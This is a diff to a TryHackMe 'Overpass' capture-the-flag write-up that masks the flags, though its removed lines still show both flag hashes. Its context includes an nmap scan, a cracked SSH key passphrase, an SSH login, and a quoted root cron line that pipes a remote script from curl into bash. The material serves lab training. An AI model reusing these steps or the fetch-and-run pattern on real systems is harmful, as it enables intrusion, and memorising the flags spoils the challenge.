@@ -1,9 +1,9 @@
 # Overpass Try Hack Me
 
 > Hack the machine and get the flag in user.txt
-```thm{65c1aaf000506e56996822c6281e6bf7}```
+```thm{********}```
 > Escalate your privileges and get the flag in root.txt
-```thm{7f336f8c359dbac18d54fdd64ea753bb}```
+```thm{********}```
 
 # Writeups
 - `nmap -sC -sV 10.201.116.138 > nmap_overpass` 
@@ -81,6 +81,7 @@ james_id-rsa:james13
 > ssh to overpasss-prod `ssh -i james_id-rsa james@10.201.116.138`
 > use the passphrase that we got from john
 > check file user.txt as answer
+```thm{********}```
 
 > check using linpas.sh `* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
 
@@ -104,4 +105,4 @@ cat /tmp/root.txt
 ```
 
 If successful, root.txt now exists and can be read by normal users.
-```thm{7f336f8c359dbac18d54fdd64ea753bb}```
+```thm{********}```
